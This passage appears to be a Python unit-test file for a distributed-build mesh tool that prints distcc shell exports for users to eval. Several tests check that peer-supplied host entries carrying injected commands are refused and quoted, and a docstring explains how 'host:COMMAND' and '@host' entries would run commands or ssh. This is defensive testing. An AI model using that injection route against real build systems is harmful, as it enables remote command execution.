        with environment(**{mesh.URL_ENV: ":4748", mesh.TOKEN_ENV: None}):
            view = mesh.look(Fake(payload))
            hosts = mesh.distcc_hosts(view, target=CHOST)
        self.assertEqual(view.peers[0].host, hostile, "the payload must reach Peer")
        self.assertEqual(hosts, [], "no route to it means no entry for it")

    def test_a_slot_that_cannot_be_named_costs_only_itself(self) -> None:
        """One bad entry makes distcc reject the WHOLE list, so it must be dropped."""
        found = slots(remote_slot(address="", host="evil", jobs=99), remote_slot())
        self.assertEqual(mesh.distcc_hosts(None, CHOST, found), ["mabruk4.local/8"])

    def test_a_hostile_address_from_the_daemon_is_still_refused(self) -> None:
        """The address is the daemon's, but the daemon read it off the peer's URL.

        `/api/build/hosts` is closer to the peer than peer-state was, so the check at
        the point of use matters more, not less: `@host` means ssh there and
        `host:COMMAND` means run that, and this output is `eval`ed by MANUAL.md.
        """
        found = slots(remote_slot(address=self.HOSTILE), remote_slot())
        self.assertEqual(mesh.distcc_hosts(None, CHOST, found), ["mabruk4.local/8"])

    def test_eval_of_the_printed_lines_assigns_rather_than_executes(self) -> None:
        """The second defence, tested against a real shell: quoting, not validation.

        Fed straight into `_exports` so the host validation above cannot be what
        makes this pass — if the only thing standing between a peer and a command
        were `distcc_host`, this test would be the one that noticed it changing.
        """
        lines = mesh._exports({"DISTCC_HOSTS": f"{self.HOSTILE}/8",
                               "DISTCC_FALLBACK": "1"})
        script = f'{lines}\nprintf %s "$DISTCC_HOSTS"'
        with tempfile.TemporaryDirectory() as scratch:
            result = subprocess.run(
                ["bash", "-c", script], capture_output=True, text=True,
                stdin=subprocess.DEVNULL, env={"T": scratch, "PATH": "/usr/bin:/bin"},
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertFalse(
                list(Path(scratch).iterdir()), "the value ran instead of being assigned"
            )
        # And it is still the value it was meant to be, verbatim.
        self.assertEqual(result.stdout, f"{self.HOSTILE}/8")


class TestBriefing(unittest.TestCase):
    """The agent's prompt must say what the mesh can do for it — or that it cannot."""

    def test_a_peer_that_can_build_is_named_with_the_command_to_use_it(self) -> None:
        with with_token():
            text = mesh.briefing(mesh.look(Fake(PEER_STATE)), target=CHOST)
        self.assertIn("mac-studio", text)
        self.assertIn(CHOST, text)
        self.assertIn('eval "$(python3 -m aios.mesh env)"', text)
        self.assertIn("--binpkg-respect-use=y", text)
        # The guarantee that makes reuse safe has to be in the same breath as the offer.
        self.assertIn("lockfile still decides", text)

    def test_the_command_names_a_route_this_node_has_not_the_peers_own_name(self) -> None:
        """`mac-studio` resolves to nothing inside a pod; the endpoint is the route.

        A briefing that told the agent to fetch from a hostname only the peer's LAN
        knows would send it debugging DNS instead of building.
        """
        with with_token():
            view = mesh.look(Fake(PEER_STATE))
            text = mesh.briefing(view, target=CHOST) + mesh.status(view, target=CHOST)
        self.assertNotIn("env mac-studio", text)
        self.assertIn('eval "$(python3 -m aios.mesh env)"', text)

        # A peer reached somewhere else is named by that URL, which does route.
        elsewhere = mesh.Peer(host="mac-studio", url="http://192.168.5.2:4748",
                              builder=mesh.Builder(chost=CHOST, cores=4))
        with with_token():
            named = mesh.briefing(mesh.Mesh(ENDPOINT, True, "", (elsewhere,)), target=CHOST)
        self.assertIn("python3 -m aios.mesh env http://192.168.5.2:4748", named)

    def test_a_reachable_mesh_with_nothing_for_this_chost_says_so(self) -> None:
        payload = dict(PEER_STATE, builder=dict(PEER_STATE["builder"],
                                                chost="x86_64-pc-linux-gnu"))
        with without_token():
            text = mesh.briefing(mesh.look(Fake(payload)), target=CHOST)
        self.assertIn("no machine", text)
        self.assertIn("compile your own", text)
        self.assertNotIn("eval", text, "there is nothing to eval")

    def test_no_mesh_at_all_still_briefs(self) -> None:
        with without_token():
            self.assertIn("BUILD MESH — none", mesh.briefing(None, target=CHOST))
            self.assertIn("normal, not", mesh.briefing(None, target=CHOST))

    def test_node_briefing_works_with_no_mesh_and_keeps_its_own_facts(self) -> None:
        text = node.briefing(node.Role(tree=True, tree_detail="32695+ ebuilds",
                                       serving=True, binpkgs=2, published="gen2"))
        self.assertIn("SEED NODE", text)          # the existing behaviour, unchanged
        self.assertIn("aios.repo sync", text)
        self.assertIn("BUILD MESH", text)         # and the mesh, absent
        self.assertIn("compiles itself", text)

    def test_node_briefing_carries_a_reachable_peer(self) -> None:
        with with_token():
            view = mesh.look(Fake(PEER_STATE))
            text = node.briefing(node.Role(tree=False, tree_detail="absent", mesh=view))
        self.assertIn("consumer", text)           # existing role text still rendered
        self.assertIn("mac-studio", text)
        self.assertNotIn(TOKEN, text)

    def test_node_role_measures_the_mesh_without_touching_the_network(self) -> None:
        with without_token():
            measured = node.role(Fake(urllib.error.URLError("no daemon")))
        assert measured.mesh is not None
        self.assertFalse(measured.mesh.reachable)
        self.assertIsInstance(node.briefing(measured), str)


class TestCLI(unittest.TestCase):
    def test_status_is_safe_to_run_anywhere(self) -> None:
        out = io.StringIO()
        with without_token(), mock.patch.object(
            mesh, "_urlopen", side_effect=urllib.error.URLError("nope")
        ):
            with redirect_stdout(out):
                code = mesh.main(["status"])
        self.assertEqual(code, 0)
        self.assertIn("endpoint", out.getvalue())
        self.assertIn("peers     none", out.getvalue())

    def test_no_argument_is_status(self) -> None:
        out = io.StringIO()
        with without_token(), mock.patch.object(
            mesh, "_urlopen", side_effect=urllib.error.URLError("nope")
        ):
            with redirect_stdout(out):
                self.assertEqual(mesh.main([]), 0)
        self.assertIn("endpoint", out.getvalue())

    def test_peers_prints_a_line_per_peer(self) -> None:
        out = io.StringIO()
        with with_token(), mock.patch.object(
            mesh, "_urlopen", return_value=json.dumps(PEER_STATE).encode()
        ):
            with redirect_stdout(out):
                self.assertEqual(mesh.main(["peers"]), 0)
        printed = out.getvalue()
        self.assertIn("mac-studio", printed)
        self.assertIn("10 core(s)", printed)
        self.assertNotIn(TOKEN, printed)

    def test_peers_with_an_empty_mesh_explains_rather_than_printing_nothing(self) -> None:
        out = io.StringIO()
        with without_token(), mock.patch.object(
            mesh, "_urlopen", side_effect=TimeoutError("timed out")
        ):
            with redirect_stdout(out):
                self.assertEqual(mesh.main(["peers"]), 0)
        self.assertIn("no peers", out.getvalue())

    def test_distcc_with_no_peer_prints_an_empty_list_and_says_what_that_means(self) -> None:
        out, err = io.StringIO(), io.StringIO()
        with without_token(), mock.patch.object(
            mesh, "_urlopen", side_effect=urllib.error.URLError("nope")
        ):
            with redirect_stdout(out), redirect_stderr(err):
                code = mesh.main(["distcc", CHOST])
        self.assertEqual(code, 0)
        # stdout stays exactly the shell lines, so `eval "$(...)"` is safe. Values
        # are `shlex.quote`d rather than wrapped in double quotes — see
        # TestDistccHostsAreNotShellCode for what the double-quoted form allowed.
        self.assertEqual(
            out.getvalue().splitlines(),
            ["export DISTCC_FALLBACK=1", "export DISTCC_HOSTS=''"],
        )
        # And the honest part — WHY nothing is on the other end — is right there on
        # stderr rather than left for someone to discover mid-build.
        self.assertIn("falls back", err.getvalue())
        self.assertIn("aios.mesh env", err.getvalue())

    def test_distcc_prints_the_hosts_it_found_and_no_credential(self) -> None:
        # Two routes now: peer-state for the mesh's own reachability, build/hosts for
        # who can compile. Only the second can answer "is there another machine".
        build_hosts = {"chost": CHOST, "hosts": [
            {"host": "mabruk4.local", "address": "10.10.20.44", "local": False,
             "builder": {"chost": CHOST, "cores": 12,
                         "distcc": {"port": 3632, "running": True,
                                    "gcc": "15.3.0", "jobs": 12,
                                    "peer_reachable": True}}},
        ]}
        out, err = io.StringIO(), io.StringIO()
        with with_token(), \
             mock.patch.object(mesh, "_urlopen", Fake(PEER_STATE, build_hosts)), \
             mock.patch.object(mesh, "local_gcc", return_value="15.3.0"):
            with redirect_stdout(out), redirect_stderr(err):
                code = mesh.main(["distcc", CHOST])
        self.assertEqual(code, 0)
        self.assertIn("export DISTCC_HOSTS=10.10.20.44/12", out.getvalue())
        # The note names the ENTRY distcc will use, which is the address this node
        # can dial — not the LAN name the peer calls itself.
        self.assertIn("10.10.20.44/12", err.getvalue())
        self.assertNotIn(TOKEN, out.getvalue() + err.getvalue())

    def test_an_unknown_command_is_usage_and_a_nonzero_exit(self) -> None:
        out = io.StringIO()
        with redirect_stdout(out):
            self.assertEqual(mesh.main(["frobnicate"]), 2)
        self.assertIn("usage:", out.getvalue())


if __name__ == "__main__":
    unittest.main()
